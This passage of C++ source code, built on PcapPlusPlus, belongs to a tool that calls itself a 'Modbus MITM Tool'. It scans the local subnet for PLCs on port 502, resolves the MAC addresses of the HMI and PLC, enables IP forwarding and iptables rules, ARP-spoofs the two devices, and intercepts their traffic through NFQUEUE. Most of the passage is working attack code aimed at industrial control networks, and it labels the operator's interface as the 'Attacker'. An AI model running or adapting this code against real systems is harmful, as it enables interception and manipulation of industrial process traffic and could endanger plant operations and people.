    uint32_t ip_as_int = ip.toInt();
    uint32_t mask_as_int = netmask.toInt();

    uint32_t network_addr_int = ip_as_int & mask_as_int;
    uint32_t broadcast_addr_int = network_addr_int | (~mask_as_int);

    // Iterate from network_addr + 1 to broadcast_addr - 1
    for (uint32_t current_ip_int = network_addr_int + 1; current_ip_int < broadcast_addr_int; ++current_ip_int) {
        ips_in_subnet.push_back(pcpp::IPv4Address(current_ip_int));
    }
    return ips_in_subnet;
}

// Callback for handling ARP responses
struct ArpResponseData {
    pcpp::MacAddress resolvedMac;
    bool           done;
};

static void onArpResponseArrived(pcpp::RawPacket* rawPacket, pcpp::PcapLiveDevice* dev, void* cookie) {
    ArpResponseData* data = (ArpResponseData*)cookie;
    pcpp::Packet parsedPacket(rawPacket);
    if (parsedPacket.isPacketOfType(pcpp::ARP)) {
        pcpp::ArpLayer* arpLayer = parsedPacket.getLayerOfType<pcpp::ArpLayer>();
        if (arpLayer->getArpHeader()->opcode == htons(PCPP_ARP_REPLY)) {
            data->resolvedMac = arpLayer->getSenderMacAddress();
            data->done = true;
        }
    }
}

pcpp::MacAddress get_mac_address(pcpp::PcapLiveDevice* dev, pcpp::IPv4Address target_ip, pcpp::IPv4Address source_ip, pcpp::MacAddress source_mac) {
    if (!dev->open()) {
        std::cerr << "Error: Could not open device " << dev->getName() << " for ARP." << std::endl;
        return pcpp::MacAddress::Zero;
    }

    pcpp::EthLayer arpEthLayer(source_mac, pcpp::MacAddress("ff:ff:ff:ff:ff:ff"), PCPP_ETHERTYPE_ARP);
    pcpp::ArpLayer arpLayer(PCPP_ARP_REQUEST, source_mac, source_ip, pcpp::MacAddress::Zero, target_ip);
    pcpp::Packet arpRequestPacket;
    arpRequestPacket.addLayer(&arpEthLayer);
    arpRequestPacket.addLayer(&arpLayer);
    arpRequestPacket.computeCalculateFields();

    ArpResponseData responseData = { pcpp::MacAddress::Zero, false };
    
    // Set a filter for ARP replies from the target IP
    pcpp::ArpFilter arpFilter(target_ip);
    pcpp::BpfFilter generalArpFilter("arp"); // Catch all ARP packets just in case
    
    if (!dev->setFilter(generalArpFilter)) { // Using a general ARP filter first for simplicity
         std::cerr << "Error: Could not set ARP filter for " << target_ip.toString() << std::endl;
         dev->close();
         return pcpp::MacAddress::Zero;
    }
    
    // Start listening for ARP replies in a non-blocking way or with timeout
    // For simplicity, we'll use a short blocking capture. For a real app, non-blocking is better.
    // PcapPlusPlus startCapture needs a callback.

    if (dev->startCapture(onArpResponseArrived, &responseData) != 0) {
        std::cerr << "Error starting capture for ARP response from " << target_ip.toString() << std::endl;
        dev->close();
        return pcpp::MacAddress::Zero;
    }

    if (!dev->sendPacket(&arpRequestPacket)) {
        std::cerr << "Error sending ARP request to " << target_ip.toString() << std::endl;
        dev->stopCapture();
        dev->close();
        return pcpp::MacAddress::Zero;
    }

    // Wait for response or timeout
    auto startTime = std::chrono::steady_clock::now();
    while (!responseData.done) {
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
        if (std::chrono::steady_clock::now() - startTime > std::chrono::seconds(2)) { // 2 second timeout
            std::cerr << "Timeout waiting for ARP reply from " << target_ip.toString() << std::endl;
            break;
        }
    }
    
    dev->stopCapture();
    dev->close(); // Close after ARP resolution attempt

    return responseData.resolvedMac;
}


// Callback for handling TCP SYN-ACK
struct SynAckData {
    bool plcFound;
    bool done;
};

static void onSynAckPacketArrived(pcpp::RawPacket* rawPacket, pcpp::PcapLiveDevice* dev, void* cookie) {
    SynAckData* data = (SynAckData*)cookie;
    pcpp::Packet parsedPacket(rawPacket);

    if (parsedPacket.isPacketOfType(pcpp::TCP)) {
        pcpp::TcpLayer* tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
        // Check for SYN-ACK flags (0x12)
        if (tcpLayer->getTcpHeader()->synFlag == 1 && tcpLayer->getTcpHeader()->ackFlag == 1) {
            data->plcFound = true;
        }
    }
    data->done = true; // Mark as done whether it's the right packet or not, to stop capture for this IP
}


bool scan_for_plc(pcpp::PcapLiveDevice* dev, pcpp::IPv4Address target_ip, pcpp::MacAddress target_mac, 
                  pcpp::IPv4Address source_ip, pcpp::MacAddress source_mac) {
    if (!dev->open()) {
        std::cerr << "Error: Could not open device " << dev->getName() << " for TCP scan." << std::endl;
        return false;
    }

    // Craft TCP SYN packet
    pcpp::EthLayer ethLayer(source_mac, target_mac, PCPP_ETHERTYPE_IP);
    pcpp::IPv4Layer ipLayer(source_ip, target_ip);
    ipLayer.getIPv4Header()->timeToLive = 64; 
    
    // Choose a random ephemeral source port
    uint16_t srcPort = (rand() % (65535 - 1024)) + 1024;
    pcpp::TcpLayer tcpLayer(srcPort, 502); // Dest port 502 for Modbus
    tcpLayer.getTcpHeader()->synFlag = 1;
    tcpLayer.getTcpHeader()->windowSize = htons(1024); // Common window size

    pcpp::Packet synPacket;
    synPacket.addLayer(&ethLayer);
    synPacket.addLayer(&ipLayer);
    synPacket.addLayer(&tcpLayer);
    synPacket.computeCalculateFields(); // Calculate checksums, etc.

    // Set BPF filter for the SYN-ACK response
    // Filter: "tcp and src host TARGET_IP and src port 502 and dst host SOURCE_IP and dst port EPHEMERAL_PORT"
    std::string filter_str = "tcp and src host " + target_ip.toString() + 
                             " and src port 502 and dst host " + source_ip.toString() +
                             " and dst port " + std::to_string(srcPort);
    pcpp::BPFStringFilter filter(filter_str);
    
    if (!dev->setFilter(filter)) {
        std::cerr << "Error: Could not set TCP SYN-ACK filter for " << target_ip.toString() << std::endl;
        dev->close();
        return false;
    }

    SynAckData responseData = { false, false };
    if (dev->startCapture(onSynAckPacketArrived, &responseData) != 0) {
        std::cerr << "Error starting capture for TCP SYN-ACK from " << target_ip.toString() << std::endl;
        dev->close();
        return false;
    }
    
    if (!dev->sendPacket(&synPacket)) {
        std::cerr << "Error sending TCP SYN to " << target_ip.toString() << std::endl;
        dev->stopCapture();
        dev->close();
        return false;
    }

    // Wait for response or timeout
    auto startTime = std::chrono::steady_clock::now();
    while (!responseData.done) {
        std::this_thread::sleep_for(std::chrono::milliseconds(50)); // Check every 50ms
        // Increased timeout for TCP SYN-ACK to 3s as 2s might be tight on some networks/VMs
        if (std::chrono::steady_clock::now() - startTime > std::chrono::seconds(3)) { 
            // std::cout << "Timeout waiting for SYN-ACK from " << target_ip.toString() << std::endl;
            break; 
        }
    }

    dev->stopCapture();
    // dev->close(); // Device is now opened/closed per call to scan_for_plc or get_mac_address.
                  // This line is removed to avoid closing a device that might be managed outside.
                  // The functions themselves will handle opening and closing.

    return responseData.plcFound;
}


int main(int argc, char* argv[]) {
    // Enable PcapPlusPlus logging if desired
    // pcpp::Logger::getInstance().setLogLevel(pcpp::Logger::Debug);

    std::cout << "Starting Modbus MITM Tool" << std::endl; // General title
    std::cout << "Using PcapPlusPlus version: " << pcpp::getPcapPlusPlusVersionString() << std::endl;
    
    srand(time(NULL)); // Seed for random source port

    signal(SIGINT, cleanup_resources);
    signal(SIGTERM, cleanup_resources);

    // --- Argument Parsing ---
    std::string interface_arg = get_cmd_option(argv, argv + argc, "-i");
    std::string hmi_ip_arg = get_cmd_option(argv, argv + argc, "-h"); 
    std::string plc_ip_arg = get_cmd_option(argv, argv + argc, "-p"); 

    // --- Interface Selection ---
    pcpp::PcapLiveDevice* selected_device = select_interface(interface_arg);
    if (!selected_device) {
        std::cout << "\nPlease specify a valid interface using the -i <interface_name_or_ip> option." << std::endl;
        return 1;
    }
    global_selected_device = selected_device; 

    std::cout << "\n--- Network Configuration ---" << std::endl;
    std::cout << "Selected interface: " << selected_device->getName() << std::endl;
    pcpp::IPv4Address attacker_ip = selected_device->getIPv4Address();
    pcpp::MacAddress attacker_mac = selected_device->getMacAddress();
    pcpp::IPv4Address netmask = selected_device->getIPv4Mask();
    global_attacker_mac = attacker_mac; 

    std::cout << "  Attacker IP: " << attacker_ip.toString() << std::endl;
    std::cout << "  Attacker MAC: " << attacker_mac.toString() << std::endl;
    std::cout << "  Netmask: " << netmask.toString() << std::endl;

    if (attacker_ip == pcpp::IPv4Address::Zero || netmask == pcpp::IPv4Address::Zero) {
        std::cerr << "Selected interface does not have a valid IPv4 address or netmask. Exiting." << std::endl;
        return 1;
    }
    
    // --- HMI IP Configuration ---
    pcpp::IPv4Address hmi_ip;
    if (!hmi_ip_arg.empty()) {
        hmi_ip = pcpp::IPv4Address(hmi_ip_arg);
        if (!hmi_ip.isValid()) {
            std::cerr << "Error: Invalid HMI IP address provided via -h: " << hmi_ip_arg << std::endl; return 1;
        }
        std::cout << "  HMI IP (from CLI): " << hmi_ip.toString() << std::endl;
    } else {
        hmi_ip = pcpp::IPv4Address("192.168.1.101"); 
        std::cout << "  HMI IP (not provided via CLI, using placeholder): " << hmi_ip.toString() << std::endl;
        std::cout << "  Use -h <hmi_ip_address> to specify." << std::endl;
    }
    global_hmi_ip = hmi_ip; 

    // --- PLC IP Configuration ---
    pcpp::IPv4Address plc_ip;
    std::vector<pcpp::IPv4Address> found_plcs_vector; // Renamed to avoid conflict

    if (!plc_ip_arg.empty()) {
        plc_ip = pcpp::IPv4Address(plc_ip_arg);
        if (!plc_ip.isValid()) {
            std::cerr << "Error: Invalid PLC IP address provided via -p: " << plc_ip_arg << std::endl; return 1;
        }
        std::cout << "  PLC IP (from CLI): " << plc_ip.toString() << std::endl;
        found_plcs_vector.push_back(plc_ip); 
    } else {
        std::cout << "\n--- PLC Discovery (Port 502 Scan) ---" << std::endl;
        // ... (PLC discovery logic as before, populating found_plcs_vector) ...
        // For brevity, assuming this part is correctly implemented from previous steps
        std::vector<pcpp::IPv4Address> subnet_ips = get_subnet_ips(attacker_ip, netmask);
        if (!subnet_ips.empty()) {
             for (const auto& current_scan_ip : subnet_ips) {
                if (current_scan_ip == attacker_ip || current_scan_ip == hmi_ip) continue;
                pcpp::MacAddress target_scan_mac = get_mac_address(selected_device, current_scan_ip, attacker_ip, attacker_mac);
                if (target_scan_mac != pcpp::MacAddress::Zero) {
                    if (scan_for_plc(selected_device, current_scan_ip, target_scan_mac, attacker_ip, attacker_mac)) {
                        found_plcs_vector.push_back(current_scan_ip);
                    }
                }
            }
        }
        if (!found_plcs_vector.empty()) {
            plc_ip = found_plcs_vector[0]; 
            std::cout << "Using first discovered PLC for MITM: " << plc_ip.toString() << std::endl;
        } else {
            std::cout << "No PLCs found. Cannot proceed." << std::endl; cleanup_resources(0); return 1;
        }
    }
    global_plc_ip = plc_ip; 

    // --- Resolve MAC Addresses for HMI and PLC ---
    std::cout << "\n--- Resolving Target MAC Addresses ---" << std::endl;
    pcpp::MacAddress hmi_mac = get_mac_address(selected_device, hmi_ip, attacker_ip, attacker_mac);
    if (hmi_mac == pcpp::MacAddress::Zero) { std::cerr << "Error: Could not resolve MAC for HMI IP: " << hmi_ip.toString() << ". Exiting." << std::endl; return 1;}
    std::cout << "HMI MAC (" << hmi_ip.toString() << "): " << hmi_mac.toString() << std::endl;
    original_hmi_mac_for_plc = hmi_mac; 

    pcpp::MacAddress plc_mac = get_mac_address(selected_device, plc_ip, attacker_ip, attacker_mac);
    if (plc_mac == pcpp::MacAddress::Zero) { std::cerr << "Error: Could not resolve MAC for PLC IP: " << plc_ip.toString() << ". Exiting." << std::endl; return 1;}
    std::cout << "PLC MAC (" << plc_ip.toString() << "): " << plc_mac.toString() << std::endl;
    original_plc_mac_for_hmi = plc_mac; 
    
    // --- Enable IP Forwarding & Configure IPTables ---
    if (!check_ip_forwarding()) {
        enable_ip_forwarding();
        // After attempting to enable, re-check. If still not enabled, this is a critical failure.
        if (!check_ip_forwarding()) {
            std::cerr << "Critical: IP forwarding could not be enabled. Please enable it manually and restart. Exiting." << std::endl;
            // Attempt to clean up any iptables rules that might have been added if other parts failed before this.
            // However, at this stage, likely no rules are added yet if this is the first critical failure.
            // If ARP spoofing or other network activities started, they should be cleaned up.
            // For simplicity here, direct exit. A more complex cleanup might be needed if other resources were active.
            exit(1); 
        }
    } else {
        std::cout << "IP forwarding is already enabled." << std::endl;
    }
    configure_iptables_rules(hmi_ip, plc_ip, true); // Add rules


    // --- Start ARP Spoofing ---
    if (!selected_device->isOpened()) {
        if (!selected_device->open()) { std::cerr << "Critical Error: Could not open device " << selected_device->getName() << " for ARP spoofing. Exiting." << std::endl; return 1;}
    }
    start_arp_spoofing(selected_device, attacker_mac, plc_ip, plc_mac, hmi_ip, hmi_mac);
    std::cout << "\nARP spoofing is running." << std::endl;

    // --- Initialize and Start NFQUEUE ---
    if (!initialize_nfq(hmi_ip, plc_ip)) {
        std::cerr << "Failed to initialize NFQUEUE. Exiting." << std::endl;
        cleanup_resources(0); // This will stop ARP spoofing and remove iptables rules
        return 1;
    }
    std::cout << "NFQUEUE processing started." << std::endl;
    std::cout << "\nMITM setup complete. Monitoring traffic. Press Ctrl+C to stop." << std::endl;
    
    // Main loop: keep threads running
    while(keep_arp_spoofing_running.load() && keep_nfq_running.load()) { 
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    
    // Cleanup is primarily handled by signal handler (Ctrl+C)
    // If loops exit for other reasons, ensure cleanup is called.
    if (keep_arp_spoofing_running.load() || keep_nfq_running.load()) { 
      cleanup_resources(0); 
    }
    
    return 0;
}
